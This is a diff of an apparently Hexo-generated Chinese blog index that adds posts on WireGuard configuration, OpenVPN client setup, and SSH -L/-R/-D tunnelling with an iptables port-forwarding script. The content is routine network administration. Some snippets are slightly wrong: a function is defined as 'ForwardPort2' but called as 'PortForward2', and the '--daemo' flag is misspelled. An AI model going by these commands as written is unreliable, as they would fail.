@@ -182,6 +182,306 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-yuque/wireguard" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/15/yuque/wireguard/">wireguard</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/15/yuque/wireguard/" class="archive-article-date">
+  	<time datetime="2021-02-15T15:16:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="1-WireGuard-的主端配置"><a href="#1-WireGuard-的主端配置" class="headerlink" title="1.WireGuard 的主端配置"></a>1.WireGuard 的主端配置</h3><p>首先我们创建一个 WireGuard 配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;wireguard&#x2F;wg0.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">ListenPort &#x3D; 8001</span><br><span class="line">PrivateKey &#x3D; 填写本机的 privatekey 内容</span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; 填写对端的 publickey 内容</span><br><span class="line">AllowedIPs &#x3D; 172.16.1.12&#x2F;32,172.16.12.0&#x2F;24</span><br><span class="line">Endpoint &#x3D; another.domain.name:8002</span><br><span class="line">PersistentKeepalive &#x3D; 25</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要创建一个网卡配置文件（此配置等价于移动客户端的 Interface 配置）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-wg0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DEVICE&#x3D;wg0</span><br><span class="line">TYPE&#x3D;wireguard</span><br><span class="line">IPADDR&#x3D;172.16.1.11</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">ONBOOT&#x3D;yes</span><br><span class="line">NAME&#x3D;wg0</span><br><span class="line">ZONE&#x3D;public</span><br></pre></td></tr></table></figure>
+
+<p>接着我们需要创建一个网卡路由文件（由于对方存在 172.16.12.0/24 这个 IP 地址段的前提下）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;route-wg0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.12.0&#x2F;24 via 172.16.1.12 dev wg0</span><br></pre></td></tr></table></figure>
+
+<p>最后我们需要允许本机的 NAT 转换，并允许系统进行 IPV4 转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-masquerade --zone&#x3D;public --permanent</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">sed -i &#39;&#x2F;net.ipv4.ip_forward&#x2F;d&#39; &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">echo &quot;net.ipv4.ip_forward&#x3D;1&quot; &gt;&gt; &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-WireGuard-的对端配置"><a href="#2-WireGuard-的对端配置" class="headerlink" title="2.WireGuard 的对端配置"></a>2.WireGuard 的对端配置</h3><p>在对端设备，我们依然需要创建一个 WireGuard 配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;wireguard&#x2F;wg0.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">ListenPort &#x3D; 8002</span><br><span class="line">PrivateKey &#x3D; 填写本机的 privatekey 内容</span><br><span class="line">DNS &#x3D; 1.1.1.1  #强制本机使用 DNS 服务器</span><br><span class="line">MTU &#x3D; 1300  #强制本机使用指定 MTU 值</span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; 填写对端的 publickey 内容</span><br><span class="line">AllowedIPs &#x3D; 172.16.1.11&#x2F;32,172.16.11.0&#x2F;24</span><br><span class="line">Endpoint &#x3D; another.domain.name:8001</span><br><span class="line">PersistentKeepalive &#x3D; 25</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要创建一个网卡配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-wg0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DEVICE&#x3D;wg0</span><br><span class="line">TYPE&#x3D;wireguard</span><br><span class="line">IPADDR&#x3D;172.16.1.12</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">ONBOOT&#x3D;yes</span><br><span class="line">NAME&#x3D;wg0</span><br><span class="line">ZONE&#x3D;public</span><br></pre></td></tr></table></figure>
+
+<p>接着我们需要创建一个网卡路由文件（假设对方存在 172.16.11.0/24 这个 IP 地址段的前提下）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;route-wg0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.11.0&#x2F;24 via 172.16.1.11 dev wg0</span><br></pre></td></tr></table></figure>
+
+<p>最后我们需要允许本机的 NAT 转换，并允许系统进行 IPV4 转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-masquerade --zone&#x3D;public --permanent</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">sed -i &#39;&#x2F;net.ipv4.ip_forward&#x2F;d&#39; &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">echo &quot;net.ipv4.ip_forward&#x3D;1&quot; &gt;&gt; &#x2F;etc&#x2F;sysctl.conf</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-WireGuard-的自动启动"><a href="#3-WireGuard-的自动启动" class="headerlink" title="3.WireGuard 的自动启动"></a>3.WireGuard 的自动启动</h3><p>第一种方案你需要编辑并添加开机启动项（手动模式推荐）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;rc.local</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip link add dev wg0 type wireguard</span><br><span class="line">wg setconf wg0 &#x2F;etc&#x2F;wireguard&#x2F;wg0.conf</span><br><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
+
+<p>注意 CentOS7 默认此文件没有执行权限，你需要赋予执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x &#x2F;etc&#x2F;rc.local</span><br></pre></td></tr></table></figure>
+
+<p>做完操作后你可以使用开机启动项的三条命令直接启用 WireGuard 进程<br>第二种方案则是需要在 Interface 里写入以下信息（注意替换 eth0 为你的互联网出口网卡，并且如果使用 wg-quick 则不需要本例 PostUp 和 PostDown 两个 iptables 命令）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Address &#x3D; 172.16.11.0&#x2F;24</span><br><span class="line">PostUp &#x3D; iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">PostDown &#x3D; iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<p>注意这样启动后网卡本身是没有防火墙区域的，你需要手动绑定一个区域</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone&#x3D;work --add-interface&#x3D;wg0 --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+
+<p>然后设置 systemd 自动启动即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable NetworkManager-wait-online.service</span><br><span class="line">sed -i &#39;s&#x2F;--timeout&#x3D;30&#x2F;--timeout&#x3D;10&#x2F;g&#39; &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;NetworkManager-wait-online.service &amp;&amp; systemctl daemon-reload</span><br><span class="line">systemctl enable wg-quick@wg0</span><br><span class="line">systemctl start wg-quick@wg0</span><br></pre></td></tr></table></figure>
+
+<h2 id="WireGuard-配置说明"><a href="#WireGuard-配置说明" class="headerlink" title="WireGuard 配置说明"></a>WireGuard 配置说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">ListenPort &#x3D; 8002  #本机监听 WireGuard 端口</span><br><span class="line">PrivateKey &#x3D; 填写本机的 privatekey 内容  #本机加密私钥</span><br><span class="line">DNS &#x3D; 1.1.1.1  #强制本机使用 DNS 服务器</span><br><span class="line">MTU &#x3D; 1300  #强制本机使用指定 MTU 值</span><br><span class="line">#Table &#x3D; 100 #强制本机将注入系统的路由的 table 指定为 100 ( 系统默认为 255 和 254 )</span><br><span class="line">#PostUp &#x3D; ip rule add from 10.10.1.0&#x2F;24 table 100 ; ip rule add from 10.10.2.0&#x2F;24 table 100</span><br><span class="line">#PreDown &#x3D; ip rule delete from 10.10.1.0&#x2F;24 table 100 ; ip rule delete from 10.10.2.0&#x2F;24 table 100</span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; 填写对端的 publickey 内容  #本机加密的对端公钥（加密后数据仅对端可以解密）</span><br><span class="line">AllowedIPs &#x3D; 172.16.1.11&#x2F;32  #本机允许的对端设备的 IP 地址段，其实就是在本机中这个虚拟网卡对端都有哪些设备 IP 地址（多 peer 不可重复）</span><br><span class="line">Endpoint &#x3D; another.domain.name:8001  #对端 WireGuard 的外部 IP（可以有一侧的 IP 地址是虚假的公网 IP）</span><br><span class="line">PersistentKeepalive &#x3D; 25   #当会话存在一端 IP 地址为 NAT 地址或虚假公网 IP 地址时，由该方阶段性每 25 秒发送 keepalive 报文保持会话的可用性，防止被设备终止。</span><br></pre></td></tr></table></figure>
+
+<p>在上方基础上，额外要注意的是<br>1、如果你存在多个 [Peer] ，则在下面直接增加一个新的 [Peer] 栏目<br>2、如果多个 Peer 存在不同的 IP，请不要让 AllowedIPs 存在重叠的 IP 地址段（比如配置多个相同/24 只有一个生效）<br>3、Endpoint 既支持以域名的方式访问，也支持以 IP 的方式访问。<br>4、会话链接的建立只要保证两端数据在一台设备上成功协商，即使有一端 IP 地址后期变更过也不会影响 VPN 的稳定性。<br>5、使用命令 wg 可以看到当前服务的运行情况。<br>6、如果你是本来打算连服务器的移动端，则在配置中你需要将移动端的 “AllowedIPs =” 补写一条内容 0.0.0.0/0,::0 以允许所有流量<br>7、前面标注 # 的三条内容，作为 iproute2 的使用方式，通过指定路由条目的 table 与 ip rule 联动控制策略流量转发。<br>8、PreUp，PostUp，PreDown，PostDown 这四个命令参数，是作为 wg-quick 快速设置/删除接口之前/之后由 bash（1）执行的四条命令，常用于配置自定义 DNS 或防火墙规则。 特殊字符串 ％i 作为变量替代所控制的 INTERFACE 配置名。 每个命令参数都支持多条命令，参数内的多条命令将按前后顺序依次执行。</p>
+<h2 id="WireGuard-的快速启动配置文件"><a href="#WireGuard-的快速启动配置文件" class="headerlink" title="WireGuard 的快速启动配置文件"></a>WireGuard 的快速启动配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;wireguard&#x2F;myserver.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">Address &#x3D; 172.16.11.0&#x2F;24</span><br><span class="line">#PostUp &#x3D; iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">#PostDown &#x3D; iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">ListenPort &#x3D; 8000</span><br><span class="line">PrivateKey &#x3D; 填写一份 privatekey 内容</span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; 填写一份 publicKey 内容</span><br><span class="line">AllowedIPs &#x3D; 172.16.11.1&#x2F;32</span><br></pre></td></tr></table></figure>
+
+<p>此配置完毕后 配置文件名为 myserver ，可以直接输入 wg-quick up myserver 启动进程<br>（如果启动失败可以先 down 一次再 up 一次）<br>（如果你是 iptables 则使用两条 iptables 命令，去掉前面的＃并记得修改 eth0 为当前系统公网网卡即可）<br>然后将新设备绑定到指定区域中，并配置好地址转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone&#x3D;external --add-interface&#x3D;myserver --permanent</span><br><span class="line">firewall-cmd --zone&#x3D;external --add-masquerade --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+
+<p>最后一样配置开机启动即可（注意命令加入的位置，在此将标准配置版的 WireGuard 进程予以注释，如果同时使用请删掉 # 字符。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable NetworkManager-wait-online.service</span><br><span class="line">sed -i &#39;s&#x2F;--timeout&#x3D;30&#x2F;--timeout&#x3D;10&#x2F;g&#39; &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;NetworkManager-wait-online.service &amp;&amp; systemctl daemon-reload</span><br><span class="line">systemctl enable wg-quick@myserver</span><br><span class="line">systemctl start wg-quick@myserver</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/15/yuque/wireguard/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/openvpn clinet" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/13/yuque/openvpn%20clinet/">openvpn clinet</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/13/yuque/openvpn%20clinet/" class="archive-article-date">
+  	<time datetime="2021-02-13T17:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>完成以下操作，配置 Linux 客户端。</p>
+<ol>
+<li>执行以下命令安装 OpenVPN 客户端。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openvpn</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>将步骤三中下载的证书解压拷贝到/etc/openvpn/conf/目录。</li>
+<li>执行以下命令启动 Openvpn 客户端软件。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --config &#x2F;etc&#x2F;openvpn&#x2F;conf&#x2F;config.ovpn --daemo</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/13/yuque/openvpn%20clinet/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/SSH 命令的三种代理功能（-L!-R!-D）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/13/yuque/SSH%20%E5%91%BD%E4%BB%A4%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%88-L!-R!-D%EF%BC%89/">SSH 命令的三种代理功能（-L/-R/-D）</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/13/yuque/SSH%20%E5%91%BD%E4%BB%A4%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%88-L!-R!-D%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2021-02-13T10:11:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ssh 命令除了登陆外还有三种代理功能：</p>
+<ul>
+<li>正向代理（-L）：相当于 iptable 的 port forwarding</li>
+<li>反向代理（-R）：相当于 frp 或者 ngrok</li>
+<li>socks5 代理（-D）：相当于 ss/ssr</li>
+</ul>
+<p>如要长期高效的服务，应使用对应的专用软件。如没法安装软件，比如当你处在限制环境下想要访问下某个不可达到的目标，或者某个临时需求，那么 ssh 就是你的兜底方案。</p>
+<p><strong>正向代理：</strong><br>所谓“正向代理”就是在本地启动端口，把本地端口数据转发到远端。<br>用法 1：远程端口映射到其他机器<br>HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，在 HostB 上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span><br></pre></td></tr></table></figure>
+
+<p>这时访问 HostB:PortB 相当于访问 HostC:PortC（和 iptable 的 port-forwarding 类似）。<br>用法 2：本地端口通过跳板映射到其他机器<br>HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC 上，在 HostA 上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -L 0.0.0.0:PortA:HostC:PortC  user@HostB</span><br></pre></td></tr></table></figure>
+
+<p>这时访问 HostA:PortA 相当于访问 HostC:PortC。<br>两种用法的区别是，第一种用法本地到跳板机 HostB 的数据是明文的，而第二种用法一般本地就是 HostA，访问本地的 PortA，数据被 ssh 加密传输给 HostB 又转发给 HostC:PortC。<br><strong>反向代理：</strong><br>所谓“反向代理”就是让远端启动端口，把远端端口数据转发到本地。<br>HostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -R HostC:PortC:HostB:PortB  user@HostC</span><br></pre></td></tr></table></figure>
+
+<p>那么链接 HostC:PortC 就相当于链接 HostB:PortB。使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>
+
+<p>相当于内网穿透，比如 HostA 和 HostB 是同一个内网下的两台可以互相访问的机器，HostC 是外网跳板机，HostC 不能访问 HostA，但是 HostA 可以访问 HostC。<br>那么通过在内网 HostA 上运行 <code>ssh -R</code> 告诉 HostC，创建 PortC 端口监听，把该端口所有数据转发给我（HostA），我会再转发给同一个内网下的 HostB:PortB。<br>同内网下的 HostA/HostB 也可以是同一台机器，换句话说就是<strong>内网 HostA 把自己可以访问的端口暴露给了外网 HostC。</strong><br>按照前文《<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/57477087">韦易笑：内网穿透：在公网访问你家的 NAS</a>》中，相当于再 HostA 上启动了 frpc，而再 HostC 上启动了 frps。</p>
+<p><strong>本地 socks5 代理</strong><br>在 HostA 的本地 1080 端口启动一个 socks5 服务，通过本地 socks5 代理的数据会通过 ssh 链接先发送给 HostB，再从 HostB 转发送给远程主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -D localhost:1080  HostB</span><br></pre></td></tr></table></figure>
+
+<p>那么在 HostA 上面，浏览器配置 socks5 代理为 127.0.0.1:1080，看网页时就能把数据通过 HostB 代理出去，类似 ss/ssr 版本，只不过用 ssh 来实现。</p>
+<p><strong>使用优化</strong><br>为了更好用一点，ssh 后面还可以加上：<code>-CqTnN</code> 参数，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -CqTnN -L 0.0.0.0:PortA:HostC:PortC  user@HostB</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>-C</code> 为压缩数据，<code>-q</code> 安静模式，<code>-T</code> 禁止远程分配终端，<code>-n</code> 关闭标准输入，<code>-N</code> 不执行远程命令。此外视需要还可以增加 <code>-f</code> 参数，把 ssh 放到后台运行。<br>这些 ssh 代理没有短线重连功能，链接断了命令就退出了，所以需要些脚本监控重启，或者使用 autossh 之类的工具保持链接。<br><strong>功能对比</strong><br>正向代理（-L）的第一种用法可以用 iptable 的 port-forwarding 模拟，iptable 性能更好，但是需要 root 权限，ssh -L 性能不好，但是正向代理花样更多些。反向代理（-R）一般就作为没有安装 frp/ngrok/shootback 时候的一种代替，但是数据传输的性能和稳定性当然 frp 这些专用软件更好。<br>socks5 代理（-D）其实是可以代替 ss/ssr 的，区别和上面类似。所以要长久使用，推荐安装对应软件，临时用一下 ssh 挺顺手。</p>
+<p>–<br>补充下 iptable 的 <code>port-forwarding</code> 怎么设置，十分管用的功能，两个函数即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line"># create forward rule by source interface</span><br><span class="line"># http:&#x2F;&#x2F;serverfault.com&#x2F;questions&#x2F;532569&#x2F;how-to-do-port-forwarding-redirecting-on-debian</span><br><span class="line">PortForward1() &#123;</span><br><span class="line">    local IN_IF&#x3D;$1</span><br><span class="line">    local IN_PORT&#x3D;$2</span><br><span class="line">    local OUT_IP&#x3D;$3</span><br><span class="line">    local OUT_PORT&#x3D;$4</span><br><span class="line">    local IPTBL&#x3D;&quot;&#x2F;sbin&#x2F;iptables&quot;</span><br><span class="line">    echo &quot;1&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br><span class="line">    $IPTBL -A PREROUTING -t nat -i $IN_IF -p tcp --dport $IN_PORT -j DNAT --to-destination $&#123;OUT_IP&#125;:$&#123;OUT_PORT&#125;</span><br><span class="line">    $IPTBL -A FORWARD -p tcp -d $OUT_IP --dport $OUT_PORT -j ACCEPT</span><br><span class="line">    $IPTBL -A POSTROUTING -t nat -j MASQUERADE</span><br><span class="line">&#125;</span><br><span class="line"># create forward rule by source ip</span><br><span class="line"># http:&#x2F;&#x2F;blog.csdn.net&#x2F;zzhongcy&#x2F;article&#x2F;details&#x2F;42738285</span><br><span class="line">ForwardPort2() &#123;</span><br><span class="line">    local IN_IP&#x3D;$1</span><br><span class="line">    local IN_PORT&#x3D;$2</span><br><span class="line">    local OUT_IP&#x3D;$3</span><br><span class="line">    local OUT_PORT&#x3D;$4</span><br><span class="line">    local IPTBL&#x3D;&quot;&#x2F;sbin&#x2F;iptables&quot;</span><br><span class="line">    echo &quot;1&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br><span class="line">    $IPTBL -t nat -A PREROUTING --dst $IN_IP -p tcp --dport $IN_PORT -j DNAT --to-destination $&#123;OUT_IP&#125;:$&#123;OUT_PORT&#125;</span><br><span class="line">    $IPTBL -t nat -A POSTROUTING --dst $OUT_IP -p tcp --dport $OUT_PORT -j SNAT --to-source $IN_IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个函数是按照网卡名称设置转发：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortForward1 eth1 8765 202.115.8.2 8765</span><br></pre></td></tr></table></figure>
+
+<p>这时，本地 eth1 网卡的 8765 端口就会被转发给 202.115.8.2 的 8765 端口。<br>第二个函数是按照本机的 ip 地址，比如本机是 192.168.1.2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortForward2 192.168.1.2 8765 202.115.8.2 8765</span><br></pre></td></tr></table></figure>
+
+<p>那么任何访问本机 192.168.1.2 这个地址 8765 端口，都会被转发到 202.115.8.2:8765<br>这个 iptable 的 <code>port forwarding</code> 是内核层运行的，性能极好，只不过每次重启都需要重新设置下。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/13/yuque/SSH%20%E5%91%BD%E4%BB%A4%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%88-L!-R!-D%EF%BC%89/">展开全文 >></a>
+        </p>
+      
+
+      
